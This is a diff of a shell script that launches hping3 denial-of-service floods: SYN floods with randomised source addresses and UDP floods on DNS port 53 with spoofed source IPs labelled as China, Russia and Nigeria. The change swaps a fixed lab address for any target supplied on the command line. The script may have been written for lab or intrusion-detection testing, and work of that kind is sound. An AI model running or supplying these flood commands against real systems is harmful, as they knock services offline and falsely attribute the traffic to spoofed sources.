@@ -1,17 +1,15 @@
 #!/bin/sh
 # Christopher Gray
-# Version 0.1.15
-#  11-10-18
+# Version 0.1.16
+#  2/26/2020
 
-if [ -z "$1" ]
-then
+if [ -z "$1" ]; then
       echo "No dest defined to attack! please define one before continuing \r\n"
       exit
 else
       server_ip=$1
       echo "Server is set to $server_ip \r\n"
 fi
-
 
 #-----------------------------------------------------------------------------------------------------------------
 # Hping3 Attacks
@@ -33,11 +31,10 @@ sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --more
 
 #--- Attacks by Country -----
 echo "Attack from China (1.92.0.10), on DNS.. \r\n"
-hping3 --flood --udp -p 53 --spoof 1.92.0.10 10.1.10.53 2> /dev/null &
+hping3 --flood --udp -p 53 --spoof 1.92.0.10 $server_ip 2> /dev/null &
 
 echo "Attack from Russia (2.72.0.10), on DNS.. \r\n"
-hping3 --flood --udp -p 53 --spoof 2.72.0.10 10.1.10.53 2> /dev/null &
+hping3 --flood --udp -p 53 --spoof 2.72.0.10 $server_ip 2> /dev/null &
 
 echo "Attack from Nigeria (77.70.128.10), on DNS.. \r\n"
-hping3 --flood --udp -p 53 --spoof 77.70.128.10 10.1.10.53 2> /dev/null &
-#--------------------------------------------------------
+hping3 --flood --udp -p 53 --spoof 77.70.128.10 $server_ip 2> /dev/null &
